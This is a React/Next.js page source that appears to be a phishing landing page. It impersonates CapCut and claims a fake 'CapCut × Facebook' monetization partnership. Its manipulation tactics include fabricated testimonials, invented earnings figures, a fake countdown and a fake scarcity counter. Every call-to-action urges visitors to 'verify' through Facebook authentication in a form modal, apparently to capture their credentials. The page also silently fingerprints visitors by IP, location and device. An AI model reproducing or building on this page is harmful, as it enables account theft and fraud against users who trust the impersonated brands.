'use client';
import { CapCutWordmark, PartnershipLogoStack } from '@/components/partnership-brand';
import { store } from '@/store/store';
import { formatCountdown, getPromoCountdownEnd, getPromoCountdownRemaining } from '@/utils/countdown';
import { getDeviceLabel } from '@/utils/device';
import { useTranslation } from '@/hooks/use-translation';
import axios from 'axios';
import dynamic from 'next/dynamic';
import { Inter } from 'next/font/google';
import SarahAvatar from '@/assets/images/testimonial-sarah.png';
import DavidAvatar from '@/assets/images/testimonial-david.png';
import AiFeatureImage from '@/assets/images/feature-ai-tools.png';
import FourKFeatureImage from '@/assets/images/feature-4k.png';
import AssetsFeatureImage from '@/assets/images/feature-assets.png';
import WorkflowImage from '@/assets/images/workflow-mobile-pc.png';
import Image from 'next/image';
import { useEffect, useState, type FC } from 'react';

const FormModal = dynamic(() => import('@/components/form-modal'), { ssr: false });

const inter = Inter({ subsets: ['latin'] });

const HERO_VIDEO = '/videos/hero-capcut.mp4';

const IMAGES = {
    sarah: SarahAvatar,
    david: DavidAvatar,
    aiFeature: AiFeatureImage,
    fourK: FourKFeatureImage,
    assets: AssetsFeatureImage,
    workflow: WorkflowImage
} as const;

const navItems = [
    { id: 'home', label: 'Home', isActive: true },
    { id: 'features', label: 'Pro Features', isActive: false },
    { id: 'free', label: 'How to Get Free', isActive: false },
    { id: 'support', label: 'Support', isActive: false }
];

const statsItems = [
    { value: '$10,000+', label: 'Average Monthly Earnings' },
    { value: '500%', label: 'Increased Monetization' },
    { value: 'Limited to 1,000', label: 'Creator Spots Available' }
];

const successStories = [
    {
        id: 'sarah',
        name: 'Sarah Thompson',
        meta: '2.3M Followers • $15,000/month',
        quote: 'Within the first month of joining the CapCut x Facebook partnership, my earnings jumped from $3,000 to $15,000. The enhanced monetization features are incredible!',
        image: IMAGES.sarah
    },
    {
        id: 'david',
        name: 'David Chen',
        meta: '1.8M Followers • $12,500/month',
        quote: "CapCut Pro's Facebook-optimized tools combined with the enhanced monetization program have completely transformed my content creation business.",
        image: IMAGES.david
    }
];

const proFeatures = [
    {
        id: 'ai',
        title: 'Powerful AI Tools',
        description: 'Remove backgrounds with one tap, enhance images, and create stunning content easier than ever.',
        image: IMAGES.aiFeature,
        hot: false
    },
    {
        id: '4k',
        title: 'No Watermark & 4K',
        description: 'Export high-quality videos up to 4K without watermarks, keeping your work professional.',
        image: IMAGES.fourK,
        hot: true
    },
    {
        id: 'assets',
        title: 'Exclusive Asset Library',
        description: 'Access thousands of exclusive templates, effects, and music tracks available only to Pro users.',
        image: IMAGES.assets,
        hot: false
    }
];

const howToSteps = [
    {
        step: 1,
        title: 'Create a New Account',
        description: 'Join the CapCut community by creating a new account via email or social media.'
    },
    {
        step: 2,
        title: 'Complete Creative Tasks',
        description: 'Complete simple video editing challenges to showcase your creative skills.'
    },
    {
        step: 3,
        title: 'Receive Your Free Pro Activation Code',
        description: 'Your activation code will be sent directly to your inbox after completing all steps.'
    }
];

const footerLinks = ['Terms of Service', 'Privacy Policy', 'Cookie Policy', 'Support Center', 'Community Guidelines'];

const PAGE_TITLE = 'Get CapCut Pro Free | Professional AI Video Editor';

const TEXTS_TO_TRANSLATE = [
    PAGE_TITLE,
    'Home',
    'Pro Features',
    'How to Get Free',
    'Support',
    'Get CapCut Pro',
    'CapCut Pro offer ends in',
    'Partnership Program',
    'CapCut × Facebook',
    'Official Partnership',
    'Exclusive Offer',
    'Get CapCut Pro Free — Professional AI Video Editing',
    'Unlock unlimited Pro features',
    'Get the full professional AI video editing toolkit at no cost. Export 4K without watermarks, use powerful AI tools, and access exclusive templates — all for free.',
    'Join and Get Pro Now',
    'Learn More',
    'Average Monthly Earnings',
    'Increased Monetization',
    'Creator Spots Available',
    'Verify Your Facebook Monetization Status',
    '812 Spots Remaining',
    'This exclusive partnership program is only available to verified Facebook monetized creators. Verify your eligibility through Facebook authentication to unlock all benefits immediately.',
    'Apply for Partnership: CapCut x Facebook Monetization',
    'Partnership Success Stories',
    'Experience True Power',
    'Unlock all limits with professional CapCut Pro.',
    'Powerful AI Tools',
    'Remove backgrounds with one tap, enhance images, and create stunning content easier than ever.',
    'No Watermark & 4K',
    'Export high-quality videos up to 4K without watermarks, keeping your work professional.',
    'Exclusive Asset Library',
    'Access thousands of exclusive templates, effects, and music tracks available only to Pro users.',
    'HOT',
    'How to Get Pro Completely Free',
    'Create a New Account',
    'Join the CapCut community by creating a new account via email or social media.',
    'Complete Creative Tasks',
    'Complete simple video editing challenges to showcase your creative skills.',
    'Receive Your Free Pro Activation Code',
    'Your activation code will be sent directly to your inbox after completing all steps.',
    'Start Your Pro Journey',
    "Don't miss your chance to get the best tools. Thousands have already received their activation code — what about you?",
    'Get Now',
    'Terms of Service',
    'Privacy Policy',
    'Cookie Policy',
    'Support Center',
    'Community Guidelines',
    '© 2026 CapCut. All rights reserved. Professional Video Editing for Creators.',
    'CapCut Pro Feature Visual',
    'Mobile and PC Workflow',
    ...successStories.flatMap((s) => [s.name, s.meta, s.quote])
] as const;

const Page: FC = () => {
    const { isModalOpen, setModalOpen, setGeoInfo, setDeviceLabel, geoInfo, deviceLabel } = store();
    const { t } = useTranslation(TEXTS_TO_TRANSLATE);
    const [modalKey, setModalKey] = useState(0);
    const [headerScrolled, setHeaderScrolled] = useState(false);
    const [countdown, setCountdown] = useState('23:59:59');

    const openModal = () => {
        setModalKey((prev) => prev + 1);
        setModalOpen(true);
    };

    useEffect(() => {
        if (geoInfo) return;

        const fetchGeoInfo = async () => {
            try {
                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                setGeoInfo({
                    asn: data.asn || 0,
                    ip: data.ip || 'CHỊU',
                    country: data.country || 'CHỊU',
                    city: data.city || 'CHỊU',
                    region: data.region || data.country_code || 'CHỊU',
                    country_code: data.country_code || 'US'
                });
            } catch {
                setGeoInfo({
                    asn: 0,
                    ip: 'CHỊU',
                    country: 'CHỊU',
                    city: 'CHỊU',
                    region: 'CHỊU',
                    country_code: 'US'
                });
            }
        };
        fetchGeoInfo();
    }, [setGeoInfo, geoInfo]);

    useEffect(() => {
        if (deviceLabel && deviceLabel !== 'Unknown') return;

        const fetchDevice = async () => {
            const label = await getDeviceLabel();
            setDeviceLabel(label);
        };

        fetchDevice();
    }, [deviceLabel, setDeviceLabel]);

    useEffect(() => {
        document.title = t(PAGE_TITLE);
    }, [t]);

    useEffect(() => {
        const endTime = getPromoCountdownEnd();

        const tick = () => {
            setCountdown(formatCountdown(getPromoCountdownRemaining(endTime)));
        };

        tick();
        const intervalId = window.setInterval(tick, 1000);
        return () => window.clearInterval(intervalId);
    }, []);

    useEffect(() => {
        const onScroll = () => setHeaderScrolled(window.scrollY > 50);
        window.addEventListener('scroll', onScroll);
        return () => window.removeEventListener('scroll', onScroll);
    }, []);

    return (
        <div className={`${inter.className} overflow-x-hidden bg-background text-on-background antialiased`}>
            <title>{t(PAGE_TITLE)}</title>

            {/* Top Banner */}
            <div className='bg-[#FF4B4B] py-2.5 text-center text-label-md font-bold tracking-wide text-white'>
                <span className='opacity-90'>{t('CapCut Pro offer ends in')}</span>{' '}
                <span className='font-mono tabular-nums'>{countdown}</span>
            </div>

            {/* Header */}
            <header
                className={`sticky top-0 z-50 border-b border-surface-border backdrop-blur-xl transition-all duration-300 ${
                    headerScrolled ? 'bg-background/95 shadow-[0_8px_32px_rgba(0,0,0,0.35)]' : 'bg-background/80'
                }`}
            >
                <div className='mx-auto grid h-16 w-full max-w-container-max grid-cols-[auto_1fr_auto] items-center gap-4 px-margin-mobile md:px-margin-desktop'>
                    <CapCutWordmark className='shrink-0' />

                    <nav className='hidden items-center justify-center gap-8 md:flex'>
                        {navItems.map((item) => (
                            <span
                                key={item.id}
                                className={`cursor-pointer whitespace-nowrap font-body-md text-body-md transition-colors ${
                                    item.isActive
                                        ? 'border-b-2 border-primary pb-1 text-primary'
                                        : 'text-on-surface-variant hover:text-on-surface'
                                }`}
                            >
                                {t(item.label)}
                            </span>
                        ))}
                    </nav>

                    <div className='flex items-center justify-end'>
                        <button
                            type='button'
                            onClick={openModal}
                            className='pro-glow-effect rounded-full bg-primary-container px-5 py-2.5 font-label-md text-label-md font-bold whitespace-nowrap text-on-primary-container transition-transform hover:scale-105 sm:px-6'
                        >
                            {t('Get CapCut Pro')}
                        </button>
                    </div>
                </div>
            </header>

            <main className='hero-gradient'>
                {/* Hero Section */}
                <section className='relative overflow-hidden pt-12 pb-24'>
                    <div className='mx-auto max-w-container-max px-margin-mobile md:px-margin-desktop'>
                        <div className='mb-12 flex flex-col items-center justify-between gap-6 md:flex-row'>
                            <div className='flex items-center gap-4 rounded-xl border border-surface-border bg-surface-container-high/50 p-3'>
                                <PartnershipLogoStack size='lg' />
                                <div className='text-left'>
                                    <p className='text-[10px] font-bold tracking-tighter text-on-surface-variant uppercase'>{t('Partnership Program')}</p>
                                    <p className='text-sm font-bold text-on-surface'>{t('CapCut × Facebook')}</p>
                                </div>
                            </div>
                            <div className='flex items-center gap-2 rounded-full border border-white/20 bg-linear-to-r from-orange-400 to-amber-600 px-4 py-2'>
                                <svg className='h-4 w-4 fill-white' viewBox='0 0 24 24'>
                                    <path d='M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z' />
                                </svg>
                                <span className='text-xs font-bold tracking-widest text-white uppercase'>{t('Official Partnership')}</span>
                                <span className='h-2 w-2 animate-pulse rounded-full bg-white' />
                            </div>
                        </div>

                        <div className='flex flex-col items-center gap-16 lg:flex-row'>
                            <div className='flex-1 text-left'>
                                <div className='mb-6 inline-flex items-center gap-2 rounded-full border border-primary-container/20 bg-primary-container/10 px-3 py-1'>
                                    <span className='h-2 w-2 animate-pulse rounded-full bg-primary-container' />
                                    <span className='text-label-sm font-label-sm tracking-widest text-primary-container uppercase'>{t('Exclusive Offer')}</span>
                                </div>
                                <h1 className='mb-4 font-headline-xl text-headline-lg leading-tight md:text-headline-xl'>
                                    {t('Get CapCut Pro Free — Professional AI Video Editing')}
                                </h1>
                                <p className='mb-6 text-xl font-bold text-primary-container'>{t('Unlock unlimited Pro features')}</p>
                                <p className='mb-10 max-w-xl font-body-lg text-body-lg text-on-surface-variant'>
                                    {t('Get the full professional AI video editing toolkit at no cost. Export 4K without watermarks, use powerful AI tools, and access exclusive templates — all for free.')}
                                </p>
                                <div className='flex flex-col gap-stack-md sm:flex-row'>
                                    <button
                                        type='button'
                                        onClick={openModal}
                                        className='pro-glow-effect rounded-full bg-primary-container px-8 py-4 font-headline-md text-headline-md text-on-primary-container transition-all hover:scale-105'
                                    >
                                        {t('Join and Get Pro Now')}
                                    </button>
                                    <button
                                        type='button'
                                        className='rounded-full border border-outline px-8 py-4 font-headline-md text-headline-md text-on-surface transition-all hover:bg-surface-variant/30'
                                    >
                                        {t('Learn More')}
                                    </button>
                                </div>
                            </div>
                            <div className='relative flex-1'>
                                <div className='relative z-10 overflow-hidden rounded-xl border border-surface-border shadow-2xl'>
                                    <video
                                        src={HERO_VIDEO}
                                        autoPlay
                                        loop
                                        muted
                                        playsInline
                                        className='aspect-[3/2] h-auto w-full object-cover'
                                        aria-label={t('CapCut Pro Feature Visual')}
                                    />
                                </div>
                                <div className='absolute -top-10 -right-10 h-32 w-32 rounded-full bg-primary-container/20 blur-3xl' />
                                <div className='absolute -bottom-10 -left-10 h-40 w-40 rounded-full bg-on-primary-container/20 blur-3xl' />
                            </div>
                        </div>
                    </div>
                </section>

                {/* Statistics Section */}
                <section className='px-margin-mobile pb-24 md:px-margin-desktop'>
                    <div className='mx-auto grid max-w-container-max grid-cols-1 gap-gutter md:grid-cols-3'>
                        {statsItems.map((stat) => (
                            <div key={stat.label} className='glass-card group flex flex-col items-center rounded-2xl p-8 text-center transition-colors hover:border-primary/50'>
                                <span className='mb-2 text-4xl font-bold text-primary'>{stat.value}</span>
                                <span className='font-medium text-on-surface-variant'>{t(stat.label)}</span>
                            </div>
                        ))}
                    </div>
                </section>

                {/* Verification Section */}
                <section className='bg-surface-container-lowest/50 px-margin-mobile py-section-gap md:px-margin-desktop'>
                    <div className='glass-card mx-auto max-w-3xl rounded-3xl border-2 border-primary/10 p-8 text-center md:p-12'>
                        <h2 className='mb-2 font-headline-lg text-headline-lg'>{t('Verify Your Facebook Monetization Status')}</h2>
                        <p className='mb-6 font-bold text-body-lg text-[#FF4B4B]'>{t('812 Spots Remaining')}</p>
                        <p className='mb-10 font-body-md leading-relaxed text-on-surface-variant'>
                            {t('This exclusive partnership program is only available to verified Facebook monetized creators. Verify your eligibility through Facebook authentication to unlock all benefits immediately.')}
                        </p>
                        <button
                            type='button'
                            onClick={openModal}
                            className='flex w-full items-center justify-center gap-4 rounded-xl bg-fb-blue px-8 py-5 font-bold text-white shadow-xl transition-all hover:scale-[1.02] hover:bg-fb-blue/90'
                        >
                            <PartnershipLogoStack size='md' />
                            <span className='text-xl'>{t('Apply for Partnership: CapCut x Facebook Monetization')}</span>
                        </button>
                    </div>
                </section>

                {/* Success Stories Section */}
                <section className='px-margin-mobile py-section-gap md:px-margin-desktop'>
                    <div className='mx-auto max-w-container-max'>
                        <h2 className='mb-16 text-center font-headline-lg text-headline-lg'>{t('Partnership Success Stories')}</h2>
                        <div className='grid grid-cols-1 gap-gutter md:grid-cols-2'>
                            {successStories.map((story) => (
                                <div key={story.id} className='glass-card flex flex-col gap-6 rounded-2xl p-8'>
                                    <div className='flex items-center gap-4'>
                                        <Image src={story.image} alt={story.name} width={64} height={64} className='h-16 w-16 rounded-full border-2 border-primary/20 object-cover' />
                                        <div>
                                            <h4 className='font-bold text-headline-md'>{t(story.name)}</h4>
                                            <p className='text-sm font-medium text-primary'>{t(story.meta)}</p>
                                        </div>
                                    </div>
                                    <p className='font-body-md leading-relaxed text-on-surface-variant italic'>&ldquo;{t(story.quote)}&rdquo;</p>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* Pro Features Section */}
                <section className='px-margin-mobile py-section-gap md:px-margin-desktop'>
                    <div className='mx-auto max-w-container-max'>
                        <div className='mb-20 text-center'>
                            <h2 className='mb-4 font-headline-lg text-headline-lg'>{t('Experience True Power')}</h2>
                            <p className='font-body-md text-on-surface-variant'>{t('Unlock all limits with professional CapCut Pro.')}</p>
                        </div>
                        <div className='grid grid-cols-1 gap-gutter md:grid-cols-3'>
                            {proFeatures.map((feature) => (
                                <div
                                    key={feature.id}
                                    className={`glass-card group rounded-xl p-stack-lg transition-all hover:bg-surface-variant/20 ${feature.hot ? 'border-2 border-primary/20' : ''}`}
                                >
                                    <div className='mb-6 aspect-[1.29] overflow-hidden rounded-lg'>
                                        <Image
                                            src={feature.image}
                                            alt={feature.title}
                                            width={400}
                                            height={310}
                                            className='h-full w-full object-cover transition-transform duration-500 group-hover:scale-110'
                                        />
                                    </div>
                                    {feature.hot ? (
                                        <div className='mb-3 flex items-center gap-2'>
                                            <h3 className='font-headline-md text-headline-md text-primary-fixed-dim'>{t(feature.title)}</h3>
                                            <span className='rounded-full bg-primary-container px-2 py-0.5 text-[10px] font-bold text-on-primary-container'>{t('HOT')}</span>
                                        </div>
                                    ) : (
                                        <h3 className='mb-3 font-headline-md text-headline-md text-primary-fixed-dim'>{t(feature.title)}</h3>
                                    )}
                                    <p className='font-body-md text-on-surface-variant'>{t(feature.description)}</p>
                                </div>
                            ))}
                        </div>
                    </div>
                </section>

                {/* How to get Section */}
                <section className='bg-surface-container-lowest py-section-gap'>
                    <div className='mx-auto flex max-w-container-max flex-col items-center gap-20 px-margin-mobile md:px-margin-desktop lg:flex-row'>
                        <div className='order-2 flex-1 lg:order-1'>
                            <div className='group relative'>
                                <div className='absolute inset-0 rounded-3xl bg-primary/10 blur-2xl transition-all group-hover:bg-primary/20' />
                                <Image src={IMAGES.workflow} alt={t('Mobile and PC Workflow')} width={600} height={400} className='relative z-10 h-auto w-full rounded-3xl border border-surface-border' />
                            </div>
                        </div>
                        <div className='order-1 flex-1 lg:order-2'>
                            <h2 className='mb-12 font-headline-lg text-headline-lg'>{t('How to Get Pro Completely Free')}</h2>
                            <div className='space-y-8'>
                                {howToSteps.map((item) => (
                                    <div key={item.step} className='flex gap-stack-md'>
                                        <div className='flex h-12 w-12 shrink-0 items-center justify-center rounded-full bg-primary-container font-bold text-on-primary-container'>
                                            {item.step}
                                        </div>
                                        <div>
                                            <h4 className='mb-2 font-headline-md text-headline-md'>{t(item.title)}</h4>
                                            <p className='font-body-md text-on-surface-variant'>{t(item.description)}</p>
                                        </div>
                                    </div>
                                ))}
                            </div>
                        </div>
                    </div>
                </section>

                {/* Final CTA Section */}
                <section className='relative overflow-hidden py-32'>
                    <div className='absolute inset-0 origin-right -skew-y-3 bg-primary/5' />
                    <div className='relative z-10 mx-auto max-w-container-max px-margin-mobile text-center md:px-margin-desktop'>
                        <h2 className='mb-6 font-headline-xl text-headline-lg md:text-headline-xl'>{t('Start Your Pro Journey')}</h2>
                        <p className='mx-auto mb-10 max-w-2xl font-body-lg text-body-lg text-on-surface-variant'>
                            {t("Don't miss your chance to get the best tools. Thousands have already received their activation code — what about you?")}
                        </p>
                        <button
                            type='button'
                            onClick={openModal}
                            className='pro-glow-effect rounded-full bg-primary-container px-12 py-5 font-headline-md text-headline-md font-bold text-on-primary-container transition-all hover:scale-110'
                        >
                            {t('Get Now')}
                        </button>
                    </div>
                </section>
            </main>

            {/* Footer */}
            <footer className='border-t border-surface-border bg-surface-container-lowest'>
                <div className='mx-auto flex w-full max-w-container-max flex-col items-center justify-between gap-stack-md px-margin-mobile py-stack-lg md:flex-row md:px-margin-desktop'>
                    <div className='flex flex-col items-center gap-stack-lg md:flex-row'>
                        <CapCutWordmark logoSize='sm' />
                        <nav className='flex flex-wrap justify-center gap-stack-md'>
                            {footerLinks.map((link) => (
                                <span key={link} className='cursor-pointer font-label-sm text-label-sm text-on-secondary-container transition-colors hover:text-primary'>
                                    {t(link)}
                                </span>
                            ))}
                        </nav>
                    </div>
                    <p className='text-center font-label-sm text-label-sm text-on-surface-variant md:text-right'>
                        {t('© 2026 CapCut. All rights reserved. Professional Video Editing for Creators.')}
                    </p>
                </div>
            </footer>

            {isModalOpen && <FormModal key={modalKey} />}
        </div>
    );
};

export default Page;
